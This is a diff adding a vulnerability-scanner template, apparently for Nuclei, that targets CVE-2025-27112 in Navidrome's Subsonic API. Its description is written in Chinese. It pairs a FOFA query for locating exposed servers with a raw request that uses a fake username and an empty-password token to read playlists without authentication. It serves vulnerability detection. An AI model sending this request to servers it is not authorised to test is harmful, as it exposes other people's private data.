@@ -1,0 +1,32 @@
+id: NAVIDROME-Permission-bypass-CVE-2025-27112
+
+info:
+  name: "Navidrome Subsonic API 身份验证逻辑缺陷导致权限绕过漏洞"
+  author: Unknown
+  severity: medium
+  description: |-
+    fofa: body="content=\"Navidrome\""
+      Navidrome Subsonic API 端点的身份验证机制存在逻辑缺陷，攻击者可通过构造不存在的用户名及无效密码哈希值（空密码加盐哈希）触发验证绕过。该漏洞允许未授权访问Subsonic终端节点，可获取用户播放列表等只读数据。由于系统权限模型限制，数据修改操作将因权限不足返回"权限被拒绝"错误。此漏洞影响范围限定于信息泄露，与CVE-2025-27112披露的认证绕过特性一致。
+  reference:
+  - https://mp.weixin.qq.com/s/oFStmaqK4DMA31ljWHXoaQ
+  tags: Navidrome
+
+http:
+- raw:
+  - |
+    GET /rest/getPlaylists?u=FakeUser&t=81f0c0fb5d202ab0d012e6eaeb722d79&s=x1vbudn1m6d&v=1.16.1&c=castafiore&f=json HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '"status":"ok"'
+    - '"openSubsonic":true'
+    - '"playlists":{'
+    condition: and
+  - type: status
+    status:
+    - 200
